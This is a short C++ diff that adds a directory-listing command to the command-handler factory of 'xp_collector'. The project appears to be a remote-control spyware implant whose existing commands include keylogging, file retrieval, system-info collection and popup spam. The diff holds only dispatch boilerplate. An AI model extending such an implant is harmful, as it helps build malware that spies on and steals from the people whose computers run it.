@@ -1,5 +1,6 @@
 #include "CommandHandlers/CommandHandlerFactory.h"
 
+#include "DirListHandler.h"
 #include "GetFileHandler.h"
 #include "CommandHandlers/PopupHandler.h"
 #include "CommandHandlers/PopupSpamHandler.h"
@@ -17,6 +18,7 @@ std::unique_ptr<xp_collector::ICommandHandler> xp_collector::CommandHandlerFacto
 	case CommandType::KeyLog: return std::make_unique<KeyLogHandler>(command_id);
 	case CommandType::GetSystemInfo: return std::make_unique<GetSystemInfoHandler>(command_id);
 	case CommandType::GetFile: return std::make_unique<GetFileHandler>(command_id);
+	case CommandType::DirList: return std::make_unique<DirListHandler>(command_id);
 	default: throw std::invalid_argument("Unhandled command type in CommandHandlerFactory");
 	}
 }
